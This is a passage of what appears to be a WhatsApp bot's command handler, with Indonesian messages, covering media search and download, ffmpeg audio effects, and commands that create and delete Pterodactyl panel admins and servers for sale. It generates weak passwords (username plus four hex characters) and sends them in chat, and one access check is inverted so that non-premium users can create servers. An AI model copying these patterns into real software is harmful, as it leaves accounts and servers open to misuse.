thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
            }, {
              quoted: m
            })

          }
        }
        throw new Error('Terjadi kesalahan')
      } catch (err) {
        console.error('Terjadi kesalahan: ', err)
        m.reply('Terjadi kesalahan')
      }
    }
    break
case "tiktoksearch":
case "ttsearch":
case "tts": {
      if (!text) return m.reply(`⚠️ Eits, kakak lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *.${command} jj epep* biar Mora bisa bantu cari yang kakak mau! 🔍💬`);
      try {
        let search = await tiktokSearchVideo(text);
        let teks = `🎥 *${search.videos[0].title}*\n\n` +
          `*ᴠɪᴅᴇᴏɪ ɪᴅ* : ${search.videos[0].video_id}\n` +
          `*ᴜsᴇʀɴᴀᴍᴇ* : ${search.videos[0].author.unique_id}\n` +
          `*ɴɪᴄᴋɴᴀᴍᴇ* : ${search.videos[0].author.nickname}\n` +
          `*ᴅᴜʀᴀᴛɪᴏɴ* : ${search.videos[0].duration} detik\n` +
          `*ʟɪᴋᴇ* : ${search.videos[0].digg_count}\n` +
          `*ᴄᴏᴍᴍᴇɴᴛ* : ${search.videos[0].comment_count}\n` +
          `*sʜᴀʀᴇ* : ${search.videos[0].share_count}\n\n` +
          `*ʟɪɴᴋ*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

        let list = '';
        let no = 1;
        for (let i of search.videos) {
          list += `\n${no++}. 🎵 *${i.title}*\n` +
            `ᴅᴜʀᴀsɪ: ${i.duration} ᴅᴇᴛɪᴋ\n` +
            `ʟɪᴋᴇ: ${i.digg_count}\n` +
            `ᴄᴏᴍᴍᴇɴᴛs: ${i.comment_count}\n` +
            `sʜᴀʀᴇs: ${i.share_count}\n` +
            ` ʟɪɴᴋ: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
        }

        await sock.sendMessage(
          m.chat, {
            video: {
              url: `https://tikwm.com${search.videos[0].play}`
            },
            caption: teks
          }, {
            quoted: m
          }
        );

        if (search.videos.length > 1) {
          await sock.sendMessage(
            m.chat, {
              text: `📚 *ᴅᴀғᴛᴀʀ ᴠɪᴅᴇᴏ ʟᴀɪɴɴʏᴀ:*\n${list}`
            }, {
              quoted: m
            }
          );
        }
      } catch (error) {
        console.log(error);
      }
    }
    break
    case "ytmp4": {
if (!text) return reply(`*Penggunaan Salah!*\ncontoh: ${cmd} (link)`)
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await sock.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await sock.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "ytmp3": {
if (!text) return reply(`*Penggunaan Salah!*\ncontoh: .ytmp3 (link)`)
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await sock.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await sock.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'yts':
    case 'ytsearch': {

      if (!text) return replyID(`Contoh : ${cmd} story wa anime`);
      const yts = require('yt-search');
      async function searchYouTube(text) {
        let search = await yts(text);
        let teks = `🔎 YouTube Search\n\nHasil Pencarian dari: ${text}\n\n`;
        let no = 1;
        let hasilPencarian = search.all.map(v => `${no++}. ${v.title}\n[Link]: ${v.url}`).join('\n\n');
        teks += hasilPencarian;
        await sock.sendMessage(m.chat, {
          text: teks
        }, {
          quoted: m
        });
      }
      searchYouTube(text);
    }
    break
case 'play':
case 'song': {
if (!text) return reply(`*Penggunaan Salah!*\ncontoh: ${cmd} Night change`)
React()
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp3(`${rees.url}`)
let urlMp3 = anu.download.url
 await sock.sendMessage(m.chat, {
          audio: {
            url: urlMp3
          },
          mimetype: 'audio/mpeg',
           contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: "120363423889841112@g.us" }, forwardedNewsletterMessageInfo: { newsletterName: `${namaBot}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: `${rees.title}`, 
thumbnailUrl: rees.thumbnail, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}}, {quoted: qkontak })
 }
if (anu.status) {

} else {
return m.reply("Error! Result Not Found")
}
break
//
async function getCookies() {
      try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/');
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
          const cookies = setCookieHeaders.map(cookieString => {
            const cookieParts = cookieString.split(';');
            const cookieKeyValue = cookieParts[0].trim();
            return cookieKeyValue;
          });
          return cookies.join('; ');
        } else {
          console.warn('No set-cookie headers found in the response.');
          return null;
        }
      } catch (error) {
        console.error('Error fetching cookies:', error);
        return null;
      }
    }
//
async function pinterest(query) {
        try {
          const cookies = await getCookies(); // Pastikan fungsi getCookies() sudah didefinisikan
          if (!cookies) {
            console.log('Failed to retrieve cookies. Exiting.');
            return [];
          }

          const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';

          const params = {
            source_url: `/search/pins/?q=${encodeURIComponent(query)}`,
            data: JSON.stringify({
              "options": {
                "isPrefetch": false,
                "query": query,
                "scope": "pins",
                "no_fetch_context_on_resource": false
              },
              "context": {}
            }),
            _: Date.now()
          };

          const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
          };

          const {
            data
          } = await axios.get(url, {
            headers: headers,
            params: params
          });

          const container = [];
          const results = data.resource_response?.data?.results?.filter((v) => v.images?.orig) || [];

          results.forEach((result) => {
            container.push({
              upload_by: result.pinner?.username || 'Unknown',
              fullname: result.pinner?.full_name || 'Unknown',
              followers: result.pinner?.follower_count || 0,
              caption: result.grid_title || 'No caption',
              image: result.images.orig.url,
              source: "https://id.pinterest.com/pin/" + result.id,
            });
          });

          return container;
        } catch (error) {
          console.error('Pinterest Error:', error);
          return [];
        }
      }
//
    case 'pin':
    case 'pinterest': {

      if (!text) return reply(`Format salah, contoh: \n${ command} Anime`)
      if (budy.match(`tobrut|susu|seksi|sexy`)) return reply('GABOLEH YA, INGAT AKHIRAT INGAT TUHAN!');
      await sock.sendMessage(m.chat, {
        react: {
          text: '⏳',
          key: m.key
        }
      })

      let anutrest = await pinterest(text) // Ambil hasil pencarian
      if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan")

      // Ambil maksimal 10 gambar biar nggak terlalu panjang
      let selectedImages = anutrest.slice(0, 10);
      let anu = []

      for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia({
          image: {
            url: selectedImages[i].image
          }
        }, {
          upload: sock.waUploadToServer
        })

        anu.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Gambar ke *${i + 1}*`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Lihat di Pinterest",
                url: selectedImages[i].source || selectedImages[i].image
              })
            }]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namaBot
          })
        })
      }

      // Buat format `carouselMessage`
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: anu
              })
            })
          }
        }
      }, {
        userJid: sender,
        quoted: m
      })

      sock.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
      })
    }
 
    break
   /*
      CONVERT
   */
   case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
				try {
					let set
					if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						await sock.sendMessage(m.chat, {
							react: {
								text: "⏱️",
								key: m.key,
							}
						})
						let media = await sock.downloadAndSaveMediaMessage(quoted)
						let ran = getRandom('.mp3')
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							sock.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: m
							})
							fs.unlinkSync(ran)
						})
					} else m.reply(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
				} catch (error) {
					 
				}
			}
			break
// #  # # # CPANEL # # #
case "cadmin": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {
    interactiveMessage: {
      title: teks,
      footer: namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: namaBot,
            button_title: namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        "name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"${user.username}\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Pasword\",\"id\":\"${password.toString()}\",\"copy_code\":\"${password.toString()}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"${global.domain}\"}`

          }
        ]
      }
    }
  },
  { quoted: m });
  }
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = (username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {
    interactiveMessage: {
      title: teks,
      footer: namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: namaBot,
            button_title: namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        "name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"${user.username}\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Pasword\",\"id\":\"${password}\",\"copy_code\":\"${password}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"${global.domain}\"}`

          }
        ]
      }
    }
  },
  { quoted: m });
delete global.panel
}
break
case "listadmin": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break



case "listpanel": case "listp": case "listserver": {
if (!isOwner) return reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "deladmin": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break


case "delpanel": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break


// ############# Cpanel V2
case "cadmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isOwner && isPremium) return reply(mess.prem)
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isOwner) return reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
